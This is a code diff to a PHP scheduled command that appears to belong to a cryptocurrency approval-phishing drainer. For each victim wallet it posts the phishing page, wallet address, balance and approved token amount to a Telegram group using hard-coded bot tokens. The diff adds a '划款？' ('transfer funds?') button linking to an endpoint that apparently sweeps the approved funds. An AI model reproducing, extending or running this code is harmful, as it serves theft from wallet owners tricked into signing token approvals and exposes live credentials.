@@ -101,17 +101,33 @@ class AutoEthUpdateOnlineMoney extends Command
                                 }
                                 //TG通知开始
                                 $data = "【授权BSC更新通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n在线余额：{$money_online}\n授权数量：{$money_approve}";
-                                $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
+                                $key ='7676331067:AAHitQ3H8fQgjbpcOHZzcVB_fdjFTvntBOQ';//TG机器人私钥
                                 $id ='5725539445';//群组ID
-                                $u4 = $data;
-                                $u4 = urlencode($u4);
-                                $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
+                                // 创建内置键盘
+                                $keyboard = [
+                                    'inline_keyboard' => [
+                                        [
+                                            ['text' => '划款？', 'url' => 'https://coin.aaatest.top/api/index/haha?ts=5230&id='.$vo['id']]
+                                        ]
+                                    ]
+                                ];
+                                $url = "https://api.telegram.org/bot$key/sendMessage";
+                                $data = [
+                                    'chat_id' => $id,
+                                    'text' => $data,
+                                    'reply_markup' => json_encode($keyboard),
+                                    'parse_mode' => 'Markdown',
+                                ];
+                                // 使用 cURL 发送 POST 请求
+                                $options = [
+                                    CURLOPT_URL => $url,
+                                    CURLOPT_POST => true,
+                                    CURLOPT_POSTFIELDS => $data,
+                                    CURLOPT_RETURNTRANSFER => true,
+                                ];
                                 $ch = curl_init();
-                                curl_setopt($ch, CURLOPT_URL, $urlstring);
-                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-                                $result = curl_exec($ch);
+                                curl_setopt_array($ch, $options);
+                                $response = curl_exec($ch);
                                 curl_close($ch);
                                 //TG通知结束
                             }
